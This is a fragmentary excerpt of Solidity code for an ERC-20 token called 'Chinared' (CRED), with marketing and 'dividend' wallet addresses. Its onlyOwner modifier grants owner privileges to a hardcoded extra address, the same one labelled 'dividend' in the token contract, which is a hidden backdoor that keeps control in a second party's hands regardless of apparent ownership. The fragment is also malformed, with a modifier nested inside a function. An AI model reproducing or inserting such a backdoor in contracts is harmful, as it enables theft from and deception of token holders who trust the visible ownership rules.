...
contract Ownable is Context {
    ...
    function owner() public view returns (address) {
        ...
        modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0xd36CA9d74f39eb6a92512E26be90aD27a7Eae76f) , "owner");
        _;
    }
...
contract Chinared  is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Chinared";
    string private _symbol = "CRED";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xBf2c66b2cDB1D4e87A75aA8F2E513A92f30aB319);
    address private _Marketing = 0xBf2c66b2cDB1D4e87A75aA8F2E513A92f30aB319;
    address public dividend = 0xd36CA9d74f39eb6a92512E26be90aD27a7Eae76f;
